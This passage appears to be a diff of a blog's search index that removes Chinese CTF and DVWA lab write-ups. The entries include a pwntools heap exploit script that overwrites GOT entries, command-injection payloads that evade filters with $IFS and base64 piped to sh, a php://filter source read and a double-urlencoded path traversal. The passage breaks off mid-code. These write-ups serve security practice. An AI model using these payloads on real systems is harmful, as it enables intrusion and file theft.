*)&amp;heapArray[<span class="number">16</span> * v1 + <span class="number">256</span>], (<span class="keyword">unsigned</span> <span class="keyword">int</span>)*(_QWORD *)&amp;heapArray[<span class="number">16</span> * v1 + <span class="number">264</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>根据<code>size</code>决定，配合<code>add</code>函数造成了堆溢出</p>
-<h2 id="house-of-orange"><a href="#house-of-orange" class="headerlink" title="house of orange"></a>house of orange</h2><p>有一种利用堆溢出可以在没有<code>free</code>函数的情况下得到一个<code>unsortedbin</code>堆块（同理也可以得到<code>fastbin</code></p>
-<p>详情请见CTFwiki</p>
-<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><h3 id="修改topbin"><a href="#修改topbin" class="headerlink" title="修改topbin"></a>修改topbin</h3><p>首先利用堆溢出修改<code>topbin</code>的大小</p>
-<p><img src="https://gitee.com/ethustdout/pics/raw/master/img/image-20200916172303763.png" alt="image-20200916172303763"></p>
-<p>运行之后</p>
-<p><img src="https://gitee.com/ethustdout/pics/raw/master/img/image-20200916172355480.png" alt="image-20200916172355480"></p>
-<p><code>topbin</code>被修改为一个小的值</p>
-<h3 id="得到fastbin"><a href="#得到fastbin" class="headerlink" title="得到fastbin"></a>得到fastbin</h3><p>把剩下的topbin分配掉，留下一个<code>0x90</code>的大小</p>
-<p><img src="https://gitee.com/ethustdout/pics/raw/master/img/image-20200916172714541.png" alt="image-20200916172714541"></p>
-<p>然后分配一个超过它大小的堆块，这个堆块就会进入<code>fastbin</code>(否则进入<code>unsortedbin</code>)</p>
-<p><img src="https://gitee.com/ethustdout/pics/raw/master/img/image-20200916172820568.png" alt="image-20200916172820568"></p>
-<p>并且这个<code>fastbin</code>的<code>fd</code>指针可控（堆溢出）</p>
-<p>修改它为<code>memset@got</code>的地址，就可以修改<code>memset    </code>函数</p>
-<p>这里修改成<code>printf</code>然后利用格式化字符串泄漏libc</p>
-<p><img src="https://gitee.com/ethustdout/pics/raw/master/img/image-20200916173137032.png" alt="image-20200916173137032"></p>
-<p>得到了libc之后在重放一次上面的操作修改<code>atoi@got</code>为<code>system</code>或者<code>one_gadget</code>即可</p>
-<p><img src="https://gitee.com/ethustdout/pics/raw/master/img/image-20200916173416122.png" alt="image-20200916173416122"></p>
-<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/home/shiroha/glibc-all-in-one/libs/2.23-0ubuntu11.2_amd64/libc-2.23.so&quot;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span>(<span class="params">command = <span class="string">&quot;&quot;</span></span>):</span></span><br><span class="line">    gdb.attach(sh, command)</span><br><span class="line">    <span class="built_in">input</span>()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">menu</span>(<span class="params">command</span>):</span></span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>, <span class="built_in">str</span>(command))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>(<span class="params">idx</span>):</span></span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;idx:&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">idx, size, content</span>):</span></span><br><span class="line">    menu(<span class="number">1</span>)</span><br><span class="line">    index(idx)</span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;size:&quot;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    <span class="keyword">if</span> content != <span class="string">&quot;&quot;</span>:</span><br><span class="line">        sh.sendafter(<span class="string">&quot;content:&quot;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx, content</span>):</span></span><br><span class="line">    menu(<span class="number">2</span>)</span><br><span class="line">    index(idx)</span><br><span class="line">    sh.sendafter(<span class="string">&quot;content:&quot;</span>, content)</span><br><span class="line"></span><br><span class="line">put_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">put_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">printf_plt = elf.plt[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x80</span>, <span class="string">&#x27;a\n&#x27;</span>)</span><br><span class="line">edit(<span class="number">0</span>, <span class="string">&quot;a&quot;</span> * <span class="number">0x18</span> + p64(<span class="number">0xfe1</span>))</span><br><span class="line">[add(<span class="number">0</span>, <span class="number">0x80</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">0x80</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x1a</span>)]</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x18</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">0x8</span>)</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x60</span>, <span class="string">&#x27;a&#x27;</span>*<span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x71</span>, <span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x90</span>, <span class="string">&#x27;%17$p&#x27;</span>.ljust(<span class="number">0x90</span>, <span class="string">&#x27;\x01&#x27;</span>))</span><br><span class="line"></span><br><span class="line">memset_addr = elf.got[<span class="string">&#x27;memset&#x27;</span>]</span><br><span class="line">edit(<span class="number">0</span>, <span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x71</span>) + p64(<span class="number">0x6021c0</span>))</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x60</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x60</span>, <span class="string">&#x27;%17$p&#x27;</span>.ljust(<span class="number">0x60</span>, <span class="string">&#x27;\x01&#x27;</span>))</span><br><span class="line">edit(<span class="number">0</span>, p64(memset_addr))</span><br><span class="line">edit(<span class="number">1</span>, p64(printf_plt))</span><br><span class="line"></span><br><span class="line">add(<span class="number">2</span>, <span class="number">0x90</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">&#x27;\x30&#x27;</span>)</span><br><span class="line">c = <span class="built_in">int</span>(<span class="string">&#x27;\x30&#x27;</span> + sh.recvuntil(<span class="string">&#x27;\x01&#x27;</span>)[:-<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">print(<span class="string">&quot;c ==&gt; &quot;</span> + <span class="built_in">hex</span>(c))</span><br><span class="line">base = c - libc.symbols[<span class="string">&#x27;__libc_start_main&#x27;</span>] - <span class="number">240</span></span><br><span class="line">print(<span class="string">&quot;base ==&gt; &quot;</span> + <span class="built_in">hex</span>(base))</span><br><span class="line"></span><br><span class="line">system = base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">sh.send(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x90</span>)</span><br><span class="line"><span class="comment"># one = [0x45226, 0x4527a, 0xf0364]</span></span><br><span class="line">edit(<span class="number">0</span>, p64(elf.got[<span class="string">&#x27;atoi&#x27;</span>]))</span><br><span class="line">edit(<span class="number">1</span>, p64(system))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <categories>
-        <category>pwn</category>
-        <category>heap</category>
-      </categories>
-      <tags>
-        <tag>pwn</tag>
-        <tag>heap</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>ACTF2020_新生赛_Exec</title>
-    <url>//buu_ACTF2020Exec.html</url>
-    <content><![CDATA[<p><a href="%5Bhttps://buuoj.cn/challenges">buuoj</a></p>
-<a id="more"></a>
-
-
-
-<p>点进靶机界面如下</p>
-<img src="[ACTF2020 新生赛]Exec/image-20200809213540334.png" alt="image-20200809213540334" style="zoom:50%;" />
-
-<p>结合题目名，猜测是命令执行</p>
-<p>输入<code>l | ls</code></p>
-<img src="[ACTF2020 新生赛]Exec/image-20200809213614575.png" alt="image-20200809213614575" style="zoom:50%;" />
-
-<p>确实是这样，一步一步查找，在根目录下找到了<code>flag</code></p>
-<img src="[ACTF2020 新生赛]Exec/image-20200809213701427.png" alt="image-20200809213701427" style="zoom:50%;" />
-
-<p>使用<code>cat</code>命令读取</p>
-<img src="[ACTF2020 新生赛]Exec/image-20200809213717018.png" alt="image-20200809213717018" style="zoom:50%;" />
-
-]]></content>
-      <categories>
-        <category>web</category>
-        <category>buu</category>
-      </categories>
-      <tags>
-        <tag>web</tag>
-        <tag>buu</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>ACTF2020_新生赛_Include</title>
-    <url>//buu_ACTF2020Include.html</url>
-    <content><![CDATA[<p><a href="%5Bhttps://buuoj.cn/challenges">buuoj</a></p>
-<a id="more"></a>
-
-
-
-<h2 id="Index-php"><a href="#Index-php" class="headerlink" title="Index.php"></a>Index.php</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;meta charset&#x3D;&quot;utf8&quot;&gt;</span><br><span class="line">&lt;a href&#x3D;&quot;?file&#x3D;flag.php&quot;&gt;tips&lt;&#x2F;a&gt;</span><br></pre></td></tr></table></figure>
-
-<p>结合题目名可以猜测是一个文件包含</p>
-<p>使用<code>php伪协议</code>读一下源码</p>
-<p><code>?file=php://filter/read=convert.base64-encode/resource=index.php</code></p>
-<p>解码之后是</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;meta charset&#x3D;&quot;utf8&quot;&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">$file &#x3D; $_GET[&quot;file&quot;];</span><br><span class="line">if(stristr($file,&quot;php:&#x2F;&#x2F;input&quot;) || stristr($file,&quot;zip:&#x2F;&#x2F;&quot;) || stristr($file,&quot;phar:&#x2F;&#x2F;&quot;) || stristr($file,&quot;data:&quot;))&#123;</span><br><span class="line">	exit(&#39;hacker!&#39;);</span><br><span class="line">&#125;</span><br><span class="line">if($file)&#123;</span><br><span class="line">	include($file);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">	echo &#39;&lt;a href&#x3D;&quot;?file&#x3D;flag.php&quot;&gt;tips&lt;&#x2F;a&gt;&#39;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="flag-php"><a href="#flag-php" class="headerlink" title="flag.php"></a>flag.php</h2><p>通过这个文件包含读一下<code>flag.php</code>的源码</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo &quot;Can you find out the flag?&quot;;</span><br><span class="line">&#x2F;&#x2F;flag&#123;bfb0b1cd-426b-4590-9b3d-059c3b3cec96&#125;</span><br></pre></td></tr></table></figure>
-
-<p>得到了flag</p>
-]]></content>
-      <categories>
-        <category>web</category>
-        <category>buu</category>
-      </categories>
-      <tags>
-        <tag>web</tag>
-        <tag>buu</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>GXYCTF2019_Ping Ping Ping</title>
-    <url>//buu_GXYCTF2019_Ping_Ping_Ping.html</url>
-    <content><![CDATA[<p><a href="%5Bhttps://buuoj.cn/challenges">buuoj</a></p>
-<a id="more"></a>
-
-
-
-<h2 id="index-php"><a href="#index-php" class="headerlink" title="index.php"></a>index.php</h2><img src="[GXYCTF2019]Ping Ping Ping/image-20200809214947203.png" alt="image-20200809214947203" style="zoom:50%;" />
-
-<p>给了一个参数是<code>ip</code>，猜测也是命令执行</p>
-<p>使用<code>?ip=l;ls</code></p>
-<img src="[GXYCTF2019]Ping Ping Ping/image-20200809215038502.png" alt="image-20200809215038502" style="zoom:50%;" />
-
-<p>尝试<code>cat flag.php</code></p>
-<img src="[GXYCTF2019]Ping Ping Ping/image-20200809215106353.png" alt="image-20200809215106353" style="zoom:50%;" />
-
-<p>过滤了空格</p>
-<h2 id="绕过空格"><a href="#绕过空格" class="headerlink" title="绕过空格"></a>绕过空格</h2><p>查找资料用于绕过空格</p>
-<p><a href="https://www.freebuf.com/articles/web/137923.html">CTF中绕过小技巧</a></p>
-<p>经过测试发现<code>$IFS$9</code>可以绕过</p>
-<img src="[GXYCTF2019]Ping Ping Ping/image-20200809215218599.png" alt="image-20200809215218599" style="zoom:50%;" />
-
-<p>继续读<code>flag.php</code></p>
-<img src="[GXYCTF2019]Ping Ping Ping/image-20200809215246648.png" alt="image-20200809215246648" style="zoom:50%;" />
-
-<p><code>flag</code>也被过滤了</p>
-<p>看一下<code>index.php</code>的代码</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    ....</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span>(preg_match(<span class="string">&quot;/ /&quot;</span>, <span class="variable">$ip</span>))&#123;</span><br><span class="line">    	<span class="keyword">die</span>(<span class="string">&quot;fxck your space!&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(preg_match(<span class="string">&quot;/bash/&quot;</span>, <span class="variable">$ip</span>))&#123;</span><br><span class="line">    	<span class="keyword">die</span>(<span class="string">&quot;fxck your bash!&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(preg_match(<span class="string">&quot;/.*f.*l.*a.*g.*/&quot;</span>, <span class="variable">$ip</span>))&#123;</span><br><span class="line">    	<span class="keyword">die</span>(<span class="string">&quot;fxck your flag!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="variable">$a</span> = shell_exec(<span class="string">&quot;ping -c 4 &quot;</span>.<span class="variable">$ip</span>);</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;</span></span><br><span class="line"><span class="string">&quot;</span>;</span><br><span class="line">  print_r(<span class="variable">$a</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="绕过flag"><a href="#绕过flag" class="headerlink" title="绕过flag"></a>绕过flag</h2><p>这里屏蔽了很多语法，但是没有屏蔽<code>base64</code>和<code>sh</code></p>
-<p>使用<code>base64 -d</code>可以达到相同的作用</p>
-<p><code>payload</code>如下</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?ip&#x3D;l;echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh</span><br></pre></td></tr></table></figure>
-
-<p>执行之后在注释里面看到<code>flag</code></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;?ip&#x3D;</span><br><span class="line">&lt;pre&gt;PING l (127.0.0.1): 56 data bytes</span><br><span class="line">&lt;?php</span><br><span class="line">$flag &#x3D; &quot;flag&#123;3158ae61-1e44-495d-9f83-f63a7c25fd14&#125;&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <categories>
-        <category>web</category>
-        <category>buu</category>
-      </categories>
-      <tags>
-        <tag>web</tag>
-        <tag>buu</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>HCTF_2018_WarmUp</title>
-    <url>//buu_HCTF2018_WarmUp.html</url>
-    <content><![CDATA[<p><a href="%5Bhttps://buuoj.cn/challenges">buuoj</a></p>
-<a id="more"></a>
-
-
-
-<h2 id="Index-php"><a href="#Index-php" class="headerlink" title="Index.php"></a>Index.php</h2><p>访问之后是一个滑稽的表情，查看网页源代码提示有一个<code>source.php</code></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang&#x3D;&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset&#x3D;&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;meta name&#x3D;&quot;viewport&quot; content&#x3D;&quot;width&#x3D;device-width, initial-scale&#x3D;1.0&quot;&gt;</span><br><span class="line">    &lt;meta http-equiv&#x3D;&quot;X-UA-Compatible&quot; content&#x3D;&quot;ie&#x3D;edge&quot;&gt;</span><br><span class="line">    &lt;title&gt;Document&lt;&#x2F;title&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;!--source.php--&gt;</span><br><span class="line">    </span><br><span class="line">    &lt;br&gt;&lt;img src&#x3D;&quot;https:&#x2F;&#x2F;i.loli.net&#x2F;2018&#x2F;11&#x2F;01&#x2F;5bdb0d93dc794.jpg&quot; &#x2F;&gt;&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>
-
-
-
-
-
-<h2 id="source-php"><a href="#source-php" class="headerlink" title="source.php"></a>source.php</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">    class emmm</span><br><span class="line">    &#123;</span><br><span class="line">        public static function checkFile(&amp;$page)</span><br><span class="line">        &#123;</span><br><span class="line">            $whitelist &#x3D; [&quot;source&quot;&#x3D;&gt;&quot;source.php&quot;,&quot;hint&quot;&#x3D;&gt;&quot;hint.php&quot;];</span><br><span class="line">            if (! isset($page) || !is_string($page)) &#123;</span><br><span class="line">                echo &quot;you can&#39;t see it&quot;;</span><br><span class="line">                return false;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            if (in_array($page, $whitelist)) &#123;</span><br><span class="line">                return true;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page &#x3D; mb_substr(</span><br><span class="line">                $page,</span><br><span class="line">                0,</span><br><span class="line">                mb_strpos($page . &#39;?&#39;, &#39;?&#39;)</span><br><span class="line">            );</span><br><span class="line">            if (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                return true;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page &#x3D; urldecode($page);</span><br><span class="line">            $_page &#x3D; mb_substr(</span><br><span class="line">                $_page,</span><br><span class="line">                0,</span><br><span class="line">                mb_strpos($_page . &#39;?&#39;, &#39;?&#39;)</span><br><span class="line">            );</span><br><span class="line">            if (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                return true;</span><br><span class="line">            &#125;</span><br><span class="line">            echo &quot;you can&#39;t see it&quot;;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (! empty($_REQUEST[&#39;file&#39;])</span><br><span class="line">        &amp;&amp; is_string($_REQUEST[&#39;file&#39;])</span><br><span class="line">        &amp;&amp; emmm::checkFile($_REQUEST[&#39;file&#39;])</span><br><span class="line">    ) &#123;</span><br><span class="line">        include $_REQUEST[&#39;file&#39;];</span><br><span class="line">        exit;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        echo &quot;&lt;br&gt;&lt;img src&#x3D;\&quot;https:&#x2F;&#x2F;i.loli.net&#x2F;2018&#x2F;11&#x2F;01&#x2F;5bdb0d93dc794.jpg\&quot; &#x2F;&gt;&quot;;</span><br><span class="line">    &#125;  </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<p>要想达到文件包含</p>
-<ul>
-<li>变量<code>$file</code>不为空</li>
-<li><code>$file</code>要是一个字符串</li>
-<li>能够通过<code>emmm::checkfile</code></li>
-</ul>
-<h3 id="emmm-checkfile"><a href="#emmm-checkfile" class="headerlink" title="emmm:checkfile"></a>emmm:checkfile</h3><p>想要<code>return true</code>就要满足以下条件</p>
-<ul>
-<li><code>$file</code>不为空</li>
-<li><code>$file</code>在两个<code>?</code>字符之间的部分需要在<code>whitelist</code>里面</li>
-</ul>
-<h2 id="hint-php"><a href="#hint-php" class="headerlink" title="hint.php"></a>hint.php</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">flag not here, and flag in ffffllllaaaagggg</span><br></pre></td></tr></table></figure>
-
-<p>告诉了<code>flag</code>存放的位置</p>
-<h2 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h2><p>对<code>?</code>字符进行两次<code>urlencode</code>就可以绕过<code>emmm:checkfile</code>。</p>
-<p>在发送数据到服务器的时候会有一次<code>urldecode</code>，然后在<code>emmm:checkfile</code>中有第二次过滤</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;6cba0961-d475-45e3-b0ea-9040e2e31cf5.node3.buuoj.cn&#x2F;source.php?file&#x3D;source.php%253f..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;ffffllllaaaagggg</span><br></pre></td></tr></table></figure>
-
-<p>访问上述url时，服务器将第一次<code>urldecode</code>，结果如下</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;6cba0961-d475-45e3-b0ea-9040e2e31cf5.node3.buuoj.cn&#x2F;source.php?file&#x3D;source.php%3f..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;ffffllllaaaagggg</span><br></pre></td></tr></table></figure>
-
-<p>在执行<code>source.php</code>的过程中，第二次解码之后的数据为</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">source.php?..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;ffffllllaaaagggg</span><br></pre></td></tr></table></figure>
-
-<p>取到<code>?</code>即<code>source.php</code>通过白名单验证</p>
-<p>至于上面的好多<code>../</code>是由于不知道<code>flag</code>文件的目录，所以只能穷举父级目录<code>../</code></p>
-]]></content>
-      <categories>
-        <category>web</category>
-        <category>buu</category>
-      </categories>
-      <tags>
-        <tag>web</tag>
-        <tag>buu</tag>
       </tags>
   </entry>
   <entry>
@@ -2782,40 +2782,6 @@
       </tags>
   </entry>
   <entry>
-    <title>dvwa-command-injection</title>
-    <url>//command-injection.html</url>
-    <content><![CDATA[<p>dvwa靶场的命令注入部分</p>
-<a id="more"></a>
-
-<h2 id="low"><a href="#low" class="headerlink" title="low"></a>low</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Submit&#x27;</span> ]  ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$target</span> = <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;ip&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Determine OS and execute the ping command.</span></span><br><span class="line">    <span class="keyword">if</span>( stristr( php_uname( <span class="string">&#x27;s&#x27;</span> ), <span class="string">&#x27;Windows NT&#x27;</span> ) ) &#123;</span><br><span class="line">        <span class="comment">// Windows</span></span><br><span class="line">        <span class="variable">$cmd</span> = shell_exec( <span class="string">&#x27;ping  &#x27;</span> . <span class="variable">$target</span> );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// *nix</span></span><br><span class="line">        <span class="variable">$cmd</span> = shell_exec( <span class="string">&#x27;ping  -c 4 &#x27;</span> . <span class="variable">$target</span> );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Feedback for the end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;<span class="subst">&#123;$cmd&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">                                </span><br></pre></td></tr></table></figure>
-
-<p><img src="./dvwa-command-injection/command-injection_low1.png" alt="img"></p>
-<p><img src="./dvwa-command-injection/command-injection_low2.png" alt="img"></p>
-<p>由于命令执行的时候没有对输入做检测，使用一些特殊的符号可以绕过。<br>最简单的可以使用 <code>; | &amp;&amp; &amp;</code> 绕过。例如输入<code>l | ls</code><br>此时命令会变成 <code>ping l | ls</code>ls指令也会被执行。</p>
-<p>注：<code>;``|</code>是Linux终端命令的分隔符</p>
-<h2 id="middle"><a href="#middle" class="headerlink" title="middle"></a>middle</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Submit&#x27;</span> ]  ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$target</span> = <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;ip&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Set blacklist</span></span><br><span class="line">    <span class="variable">$substitutions</span> = <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">&#x27;&amp;&amp;&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;;&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Remove any of the charactars in the array (blacklist).</span></span><br><span class="line">    <span class="variable">$target</span> = str_replace( array_keys( <span class="variable">$substitutions</span> ), <span class="variable">$substitutions</span>, <span class="variable">$target</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Determine OS and execute the ping command.</span></span><br><span class="line">    <span class="keyword">if</span>( stristr( php_uname( <span class="string">&#x27;s&#x27;</span> ), <span class="string">&#x27;Windows NT&#x27;</span> ) ) &#123;</span><br><span class="line">        <span class="comment">// Windows</span></span><br><span class="line">        <span class="variable">$cmd</span> = shell_exec( <span class="string">&#x27;ping  &#x27;</span> . <span class="variable">$target</span> );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// *nix</span></span><br><span class="line">        <span class="variable">$cmd</span> = shell_exec( <span class="string">&#x27;ping  -c 4 &#x27;</span> . <span class="variable">$target</span> );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Feedback for the end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;<span class="subst">&#123;$cmd&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">                                </span><br></pre></td></tr></table></figure>
-
-<p>增加了一个操作，过滤了&amp;&amp; 和 ;操作符，但是没有过滤 | 和 &amp;</p>
-<p><img src="./dvwa-command-injection/command-injection_middle1.png" alt="img"></p>
-<p><img src="./dvwa-command-injection/command-injection_middle2.png" alt="img"></p>
-<p>由于过滤并不完全，导致存在漏网之鱼。</p>
-<h2 id="high"><a href="#high" class="headerlink" title="high"></a>high</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Submit&#x27;</span> ]  ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$target</span> = trim(<span class="variable">$_REQUEST</span>[ <span class="string">&#x27;ip&#x27;</span> ]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Set blacklist</span></span><br><span class="line">    <span class="variable">$substitutions</span> = <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">&#x27;&amp;&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;;&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;| &#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;-&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;$&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;(&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;)&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;`&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;||&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Remove any of the charactars in the array (blacklist).</span></span><br><span class="line">    <span class="variable">$target</span> = str_replace( array_keys( <span class="variable">$substitutions</span> ), <span class="variable">$substitutions</span>, <span class="variable">$target</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Determine OS and execute the ping command.</span></span><br><span class="line">    <span class="keyword">if</span>( stristr( php_uname( <span class="string">&#x27;s&#x27;</span> ), <span class="string">&#x27;Windows NT&#x27;</span> ) ) &#123;</span><br><span class="line">        <span class="comment">// Windows</span></span><br><span class="line">        <span class="variable">$cmd</span> 